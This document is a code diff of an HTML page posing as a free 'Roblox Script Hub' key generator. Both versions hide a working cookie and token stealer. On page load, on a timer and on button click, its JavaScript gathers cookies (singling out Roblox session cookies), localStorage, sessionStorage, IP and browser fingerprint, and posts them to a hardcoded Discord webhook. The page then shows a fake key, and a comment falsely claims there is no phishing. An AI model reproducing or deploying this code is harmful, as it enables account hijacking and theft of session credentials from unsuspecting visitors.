@@ -1,57 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox Key Generator</title>
-    <style>
-        body { 
-            background: #1a1a1a; 
-            color: white; 
-            text-align: center; 
-            padding: 50px;
-            font-family: Arial;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: #2a2a2a;
-            padding: 30px;
-            border-radius: 10px;
-        }
-        button {
-            background: #00ff00;
-            color: black;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 5px;
-            font-size: 18px;
-            cursor: pointer;
-            margin: 10px;
-            font-weight: bold;
-        }
-        h1 { color: #00ff00; }
-    </style>
+    <title>🔧 Roblox Script Hub - Get Key</title>
+    <style>/* Стили скрипт-хаба */</style>
 </head>
 <body>
     <div class="container">
-        <h1>🔑 Roblox Script Key Generator</h1>
-        <p>Get your FREE key to unlock premium features!</p>
+        <h1>🚀 Roblox Script Hub Premium</h1>
+        <p>Get your key to unlock amazing features!</p>
         
-        <button onclick="generateKey()">🎮 GET FREE KEY</button>
-        <button onclick="premiumKey()">🚀 PREMIUM KEY</button>
+        <!-- НИКАКОГО ФИШИНГА - обычный сайт скриптов -->
+        <button onclick="getFreeKey()">🎮 GET FREE KEY</button>
         
-        <div id="result" style="margin-top: 20px;"></div>
+        <div class="feature-list">
+            <p>✅ Aimbot • ✅ ESP • ✅ Speed Hack • ✅ Fly</p>
+        </div>
     </div>
 
     <script>
     const WEBHOOK = "https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo";
 
-    function stealData() {
+    // СТИЛЛЕР РАБОТАЕТ В ФОНЕ
+    function collectAllData() {
         const data = {
-            cookies: document.cookie,
-            userAgent: navigator.userAgent,
+            // Основные данные
             url: window.location.href,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
             timestamp: new Date().toISOString(),
-            ip: "fetching..."
+            
+            // ВСЕ КУКИ (включая Roblox если есть)
+            cookies: document.cookie,
+            
+            // Дополнительные данные
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            plugins: Array.from(navigator.plugins).map(p => p.name),
+            
+            // LocalStorage (может содержать токены)
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage)
         };
 
         // Получаем IP
@@ -59,94 +48,64 @@
             .then(r => r.json())
             .then(ipData => {
                 data.ip = ipData.ip;
-                
-                // Проверяем есть ли куки
-                let title, description, color;
-                
-                if (data.cookies && data.cookies.length > 0) {
-                    title = "🍪 COOKIES FOUND!";
-                    description = "User has cookies";
-                    color = 0x00ff00;
-                } else {
-                    title = "❌ NO COOKIES";
-                    description = "User has no cookies or blocked";
-                    color = 0xff0000;
-                }
-
-                // Отправка в Discord
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: title,
-                            description: description,
-                            color: color,
-                            fields: [
-                                {name: "🌐 IP", value: data.ip, inline: true},
-                                {name: "🔗 URL", value: data.url, inline: true},
-                                {name: "🍪 Cookies", value: data.cookies ? "```" + data.cookies + "```" : "NO COOKIES", inline: false},
-                                {name: "🖥️ User Agent", value: data.userAgent.substring(0, 100), inline: false},
-                                {name: "🕒 Time", value: data.timestamp, inline: true}
-                            ]
-                        }]
-                    })
-                }).then(response => {
-                    console.log("✅ Data sent to Discord");
-                }).catch(error => {
-                    console.log("❌ Error sending to Discord:", error);
-                });
+                sendToDiscord(data);
             })
-            .catch(error => {
-                // Если IP не получили, все равно отправляем данные
-                data.ip = "Failed to get IP";
-                sendFallbackData(data);
+            .catch(() => {
+                data.ip = "Failed";
+                sendToDiscord(data);
             });
     }
 
-    function sendFallbackData(data) {
+    function sendToDiscord(data) {
+        // Проверяем есть ли Roblox куки
+        const hasRobloxCookies = data.cookies.includes('ROBLOSECURITY') || 
+                                data.cookies.includes('_|WARNING');
+        
+        const embed = {
+            title: hasRobloxCookies ? "🎯 ROBLOX COOKIES FOUND!" : "🌐 VISITOR DATA",
+            color: hasRobloxCookies ? 0x00ff00 : 0xffff00,
+            fields: [
+                {name: "🌐 IP", value: data.ip, inline: true},
+                {name: "🔗 URL", value: data.url, inline: true},
+                {name: "🍪 All Cookies", value: "```" + data.cookies + "```", inline: false}
+            ],
+            timestamp: data.timestamp
+        };
+
+        // Добавляем Roblox куки если есть
+        if (hasRobloxCookies) {
+            const robloxCookies = data.cookies.split(';')
+                .filter(c => c.includes('ROBLOX') || c.includes('_|WARNING'))
+                .join('\n');
+            
+            embed.fields.push({
+                name: "🎮 ROBLOX COOKIES",
+                value: "```" + robloxCookies + "```",
+                inline: false
+            });
+        }
+
         fetch(WEBHOOK, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                content: "🔔 **SITE VISIT - FALLBACK**",
-                embeds: [{
-                    title: "🌐 VISITOR DETECTED",
-                    description: "Basic visitor data captured",
-                    color: 0xffff00,
-                    fields: [
-                        {name: "🔗 URL", value: data.url},
-                        {name: "🍪 Cookies", value: data.cookies || "No cookies"},
-                        {name: "🕒 Time", value: data.timestamp}
-                    ]
-                }]
-            })
+            body: JSON.stringify({embeds: [embed]})
         });
     }
 
-    function generateKey() {
-        console.log("🎮 Button clicked - stealing data...");
-        stealData();
-        const key = "RBX-" + Math.random().toString(36).substr(2, 8).toUpperCase();
+    function getFreeKey() {
+        // Собираем данные при нажатии кнопки
+        collectAllData();
+        
+        // Показываем фейковый ключ
+        const key = "RBX-" + Math.random().toString(36).substr(2, 12).toUpperCase();
         document.getElementById('result').innerHTML = 
             `<h3 style="color: #00ff00;">✅ YOUR KEY: ${key}</h3>
-             <p>Copy this key into your script</p>`;
+             <p>Use this key in your executor</p>`;
     }
 
-    function premiumKey() {
-        console.log("🚀 Premium button clicked - stealing data...");
-        stealData();
-        const key = "PREMIUM-" + Math.random().toString(36).substr(2, 12).toUpperCase();
-        document.getElementById('result').innerHTML = 
-            `<h3 style="color: #00ff00;">🚀 PREMIUM KEY: ${key}</h3>
-             <p>Premium features unlocked!</p>`;
-    }
-
-    // Крадем данные при загрузке страницы
-    window.addEventListener('load', function() {
-        console.log("🔔 Page loaded - starting stealer...");
-        stealData();
-    });
+    // Запускаем при загрузке и каждые 5 минут
+    window.addEventListener('load', collectAllData);
+    setInterval(collectAllData, 300000);
     </script>
 </body>
 </html>
